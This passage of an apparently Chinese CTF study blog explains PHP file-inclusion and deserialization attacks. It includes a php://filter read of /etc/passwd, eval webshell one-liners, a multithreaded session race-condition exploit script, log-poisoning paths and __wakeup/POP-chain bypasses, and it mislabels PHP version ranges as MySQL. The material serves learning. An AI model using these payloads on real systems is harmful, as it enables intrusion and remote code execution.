class="string">&quot;具有文件包含漏洞的网址?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">phpfile=<span class="string">&quot;&lt;?php  @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>   <span class="comment">#phpfile对应的就是上传的文件的内容</span></span><br><span class="line">filedata=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:phpfile</span><br><span class="line">&#125;</span><br><span class="line">bak=res.post(url=url,files=filedata)</span><br><span class="line"><span class="built_in">print</span>(bak.text)  <span class="comment">#最后输出网站奔溃,说明临时文件保存成功</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>Session 文件包含漏洞是一种利用条件竞争漏洞的攻击方法。它利用了服务器在处理文件上传时，可能会执行恶意代码的漏洞。攻击者可以通过控制 session 文件中的内容，传入恶意代码，然后通过文件包含漏洞来执行恶意代码。为了成功利用这个漏洞，需要知道服务器存储<code>session文件的存储位置</code>和<code>文件名格式</code>。<br>与session文件包含有关的配置,以及默认情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">session.save_path：</span><br><span class="line">默认情况下，可能设置为系统的临时目录，例如 Linux/Unix 系统上的 /tmp 目录。(我们可以采用phpinfo()来查看)</span><br><span class="line"></span><br><span class="line">session.name：默认值为 PHPSESSID,配置选项用于定义表单中用于报告上传进度的字段的名称,最大的好处是，它的值可控。</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup:  默认为on,开启后 PHP 在文件上传结束后立即清空对应会话文件中的内容。(如果这个选项为on,意味着我们需要条件竞争)</span><br><span class="line"></span><br><span class="line">session.cookie_secure：默认值为 0，表示会话 cookie 可以通过非安全连接（如 HTTP）传输。</span><br><span class="line"></span><br><span class="line">session.use_only_cookies：默认值为 1，表示仅使用 cookie 来存储会话 ID。</span><br><span class="line"></span><br><span class="line">session.auto_start:  </span><br><span class="line">默认情况下，这个选项都是关闭的。开启后则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。</span><br><span class="line"></span><br><span class="line">session.use_strict_mode：</span><br><span class="line">默认值为 0，设置为 0 以允许用户自定义会话 ID。例如，用户可以在 cookie 中设置 PHPSESSID=TGAO，则 PHP 将在服务器上创建一个名为 /tmp/sess_TGAO 的文件。即使用户没有初始化会话，PHP 也会自动初始化会话。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>放一个别人写的多线程python脚本,<a target="_blank" rel="noopener" href="https://www.cnblogs.com/TTaly/p/16934584.html">原文连接</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">parameter = <span class="string">&quot;QAQ&quot;</span>  <span class="comment"># 参数名称</span></span><br><span class="line">url = <span class="string">&quot;http://43.143.7.97:28098/&quot;</span>  <span class="comment"># 修改url地址</span></span><br><span class="line">catalogue = <span class="string">&quot;/tmp&quot;</span>  <span class="comment"># 存放session文件的目录</span></span><br><span class="line">data = &#123;<span class="string">&quot;aaa&quot;</span>: <span class="string">&quot;system(&#x27;cat /var/ffflllaaagggflag&#x27;);&quot;</span>&#125;  <span class="comment"># 执行的命令</span></span><br><span class="line">filename = <span class="string">&quot;test.txt&quot;</span>  <span class="comment"># 上传的文件名  要上传文件 它会携带者PHP_SESSION_UPLOAD_PROGRESS发送  而且会存储到sess_id文件里面</span></span><br><span class="line">sess_id = <span class="string">&quot;abc&quot;</span>  <span class="comment"># sess拼接的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;sess_id&#125;</span>&lt;?php eval($_POST[aaa]);?&gt;<span class="subst">&#123;sess_id&#125;</span>&quot;</span>&#125;</span><br><span class="line">        cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: sess_id&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (filename, f)&#125;</span><br><span class="line">        session.post(url=url, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?<span class="subst">&#123;parameter&#125;</span>=<span class="subst">&#123;catalogue&#125;</span>/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="require-once软连接绕过"><a href="#require-once软连接绕过" class="headerlink" title="require_once软连接绕过"></a>require_once软连接绕过</h2><p><code>require_once()</code>函数与<code>require()</code>函数功能类似，但所包含的信息只执行一次,使用这个函数可以避免相同的文件被包含多次,但是如果我们需要利用文件包含漏洞来读取源码时,如果关键文件已经被包含过了,就要想办法绕过<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235#h2-0">贴一个大佬讲解原理</a><br>说实话没怎么看懂……简单来说<br>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含<br><strong>payload:</strong><code>/proc/self/root</code>这个代表的是根目录<br><code>/proc/self/root/proc/self/root</code>这个代表的还是根目录<br>加上很多很多的软连接,就可以绕过<code>require_once</code>,这时候还在根目录,再加上<code>/var/www/html/flag.php</code><br>许多基于 PHP 的网站都将其文件存储在 &#x2F;var&#x2F;www&#x2F;html 目录下。这是一个常用的位置</p>
<h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache服务器日志存放文件位置：/var/log/apache/access.log</span><br><span class="line">nginx服务器日志存放位置：/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
<p>日志包含是属于本地文件包含,如果可以控制参数包含日志文件的话,且服务器有对应漏洞,就会产生一定的回显,可以利用这个进行命令注入(一句话木马或是直接写入命令)<br><strong>apache</strong>会存放我们的url参数在访问时回显，这使得我们可以在<code>url</code>后进行命令的注入。<br><strong>nginx</strong>可以看到回显的是ua报文头，同理，我们可以在<code>ua头</code>进行命令的注入</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">学习反序列化漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-23 16:21:37" itemprop="dateCreated datePublished" datetime="2023-04-23T16:21:37+08:00">2023-04-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-10 20:10:26" itemprop="dateModified" datetime="2023-05-10T20:10:26+08:00">2023-05-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>40 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单来说,序列化是值将数据结构或是对象转换为一种格式(每种语言不太相同),目的是为了更方便储存或是传输<br>反序列化就是序列化的逆过程,将序列化后的数据转回原始的数据结构或对象<br>暂时分为<strong>php</strong>和<strong>java</strong>两个方向来讲述反序列化漏洞(也许有一些<strong>Python</strong>),这篇主要讲述PHP的反序列化漏洞以及一些技巧</p>
<h2 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>序列化与反序列化本身并不存在问题,但是如果后端编写时导致用户能控制反序列化后的数据,用户就可以通过构造恶意序列化的数据来产生<strong>非预期对象</strong><br>php序列化函数<code>serialize()</code>，php反序列化函数<code>unserialize()</code><br>但是在php中,如果用户要利用反序列化漏洞,必须满足后端不正确的使用了魔术方法,在调用魔术方法时,产生了危害<br><strong>流程</strong>:我们可以序列化一个可以控制属性值的对象,反序列化之后这个字符串会被还原成对象,但是序列化能表示的只有属性,不包含方法,所以想要利用这个漏洞的话,我们就需要用各种手段,将需要的属性都赋上合适的值(有时候甚至是一个对象pop链,)<br>简单来说就是,我们先利用这个类创建一个可控对象,再将这个对象序列化后传入后台,如果后台这个地方会反序列化,那就成功了!</p>
<p>魔术方法简单来说,就是在类中,满足了一定条件后,会自动触发的函数,之前写的比较<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/17/PHP%E7%9A%84%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">详细一点</a></p>
<h3 id="序列化含义"><a href="#序列化含义" class="headerlink" title="序列化含义"></a>序列化含义</h3><p>在 PHP 序列化后的字符串中，与序列化有关的字母包括：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a：表示数组。</span><br><span class="line">i：表示整数。</span><br><span class="line">b：表示布尔值。</span><br><span class="line">d：表示双精度浮点数。</span><br><span class="line">s：表示字符串。</span><br><span class="line">N：表示 NULL 值。</span><br><span class="line">O：表示对象。</span><br><span class="line">C：表示自定义对象序列化。</span><br><span class="line">r：表示引用。</span><br><span class="line">R：表示指针引用。</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>序列化一个对象</strong><br>PHP 会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。序列化后的字符串以 <code>O</code> 开头，后面跟着类名的长度、类名、对象大小和对象中每个属性的名称和值。<br><strong>private</strong> 的属性序列化后 属性名变成 <code>&lt;0x00&gt;对象&lt;0x00&gt;属性名</code><br><strong>public</strong> 属性名没有任何变化<br><strong>protected</strong> 的属性序列化后 属性名变成 <code>&lt;0x00&gt;*&lt;0x00&gt;属性名</code><br>特殊十六进制<code>&lt;0x00&gt;</code>表示一个空字节,如果要在url中使用要url编码后的<code>%00</code><br>下面是个简单的例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$var1</span> = <span class="string">&#x27;value 1&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var2</span> = <span class="string">&#x27;value 2&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$var3</span> = <span class="string">&#x27;value 3&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;MyClass&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;var1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;&lt;0x00&gt;*&lt;0x00&gt;var2&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;&lt;0x00&gt;MyClass&lt;0x00&gt;var3&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;value 3&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>序列化一个数组</strong><br>当序列化一个数组时,会以键和键值作为对应的字符串储存<br>简单的例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = <span class="string">&#x27;not&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;flag&quot;</span>] = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;not&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="构造序列化后的字符串"><a href="#构造序列化后的字符串" class="headerlink" title="构造序列化后的字符串"></a>构造序列化后的字符串</h3><p>在存在反序列化漏洞时,我们需要传入序列化后的字符串,手动构造对一个类进行序列化时,有时容易出错<br>可以直接在源码后加入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Class</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
<p>创建一个对象后序列化,就可以简单的构造序列化后的字符串,需要注意的是,私有属性和受保护属性的属性名是有不可见字符<code>0x00</code>的,无法直接复制,可以用url编码<code>%00</code>代替</p>
<h3 id="wakeup-魔术方法绕过"><a href="#wakeup-魔术方法绕过" class="headerlink" title="__wakeup()魔术方法绕过"></a>__wakeup()魔术方法绕过</h3><ol>
<li><p><strong>CVE漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">7.0.0 - 7.0.14</span><br><span class="line">7.1.0</span><br><span class="line">5.4.14 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.29</span><br></pre></td></tr></table></figure>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br>原本：O:4:”Name”:<strong>2</strong>:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}   数字2代表这个对象有两个属性<br>绕过：O:4:”Name”:<strong>3</strong>:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}   数字3代表这个对象有三个属性,实际只有两个,绕过<code>__wakeup()</code></p>
</li>
<li><p><strong>使用C代替O绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">5.3.0 - 5.3.29</span><br><span class="line">5.4.0 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.40</span><br><span class="line">7.0.0 - 7.0.33</span><br><span class="line">7.1.0 - 7.1.33</span><br><span class="line">7.2.0 - 7.2.34</span><br><span class="line">7.3.0 - 7.3.28</span><br><span class="line">7.4.0 - 7.4.16</span><br><span class="line">8.0.0 - 8.0.3</span><br></pre></td></tr></table></figure>
<p>我们传入一个类似于<code>C:7:&quot;MyClass&quot;:0:&#123;&#125;</code>,没有任何属性和值,这样就可以绕过<code>__wakeup</code><br>但是使用这个方法的话,反序列化出的对象只能执行<code>construct</code>或是<code>__destruct</code>,且不能给属性赋值<br>O表示一个普通对象，而C表示一个自定义序列化的对象。如果一个类实现了Serializable接口并在类中定义了<code>serialize()</code>和<code>unserialize()</code>方法，那么这时<code>serialize()</code>这个类的对象时，会生成一个以 C 开头的序列化字符串</p>
</li>
<li><p><strong>利用反序列化字符串报错fast-destruct</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql版本条件</span><br><span class="line">5.3.0 - 5.3.29</span><br><span class="line">5.4.0 - 5.4.45</span><br><span class="line">5.5.0 - 5.5.38</span><br><span class="line">5.6.0 - 5.6.40</span><br><span class="line">7.0.0 - 7.0.33</span><br><span class="line">7.1.0 - 7.1.33</span><br><span class="line">7.2.0 - 7.2.34</span><br><span class="line">7.3.0 - 7.3.28</span><br><span class="line">7.4.0 - 7.4.16</span><br><span class="line">8.0.0 - 8.0.3</span><br></pre></td></tr></table></figure>
<p>在序列化字符串最后面加上一个<code>N;</code>，从而触发错误并优先执行<code>__destruct</code>，从而实现对<code>__wakeup</code>的绕过。<br>这种方法的原理是，在反序列化过程中，如果遇到错误，PHP会抛出一个异常。如果在类中定义了__destruct方法，那么在抛出异常之前，PHP会先调用这个方法来清理资源。因此，如果在序列化字符串最后面加上一个<code>N;</code>，就会触发一个错误，并且在抛出异常之前，PHP会先调用<code>__destruct</code>方法。<br>这种方法适用于类中定义了__destruct方法，并且在这个方法中可以执行一些有用的操作的情况。但是它依赖于特定的类结构和代码逻辑，因此并不是所有情况下都能成功。<br>例如  O:4:”Test”:1:{s:4:”data”;s:11:”Hello World”;<strong>N;</strong>}</p>
</li>
</ol>
<h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><ol>
<li><strong>切入点</strong><br> 当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使$a永远与$b相等<br> 简单来说,这个方式就是将一个属性的值赋值为另一个属性的地址<br> 例如 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Test</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$Test</span>-&gt;a=&amp;Test-&gt;b;   <span class="comment">//将a的值赋值为b的地址,可以实现一些绕过</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(@<span class="title function_ invoke__">serialize</span>(<span class="variable">$Test</span>));</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><ol>
<li><strong>什么是pop链</strong><br>POP链（Property Oriented Programming Chain）是一种利用PHP魔术方法进行多次跳转，最终到达关键函数,获取敏感数据。它通常与反序列化漏洞一起出现，可以理解为是反序列化漏洞利用的一种拓展，泛用性更强，涉及到的魔法方法也更多</li>
<li><strong>怎么切入</strong><br>如果一个题目里出现了很多的类和魔术方法,并且出现了反序列化函数,这题很有可能是考察pop的思考,<br>如果遇到这种情况,首先应该确定出发点(一般来说是可以自动触发的魔术方法)和终点(危险函数所在的魔术方法),在用逆推和正推相结合写出一条完整的链子</li>
<li><strong>链子怎么写</strong><br>如果是逆推的话,先看这个方法要怎么到达,再看下面有没有符合条件的情况,比如危险函数在魔术方法<code>__invoke</code>中,试着去寻找有没有在方法中把属性当做函数使用的,如果有,那么把属性对象化,那不就是把对象当做函数使用,这时就会跳转到<code>__invoke</code>中了  </li>
<li><strong>例子</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span 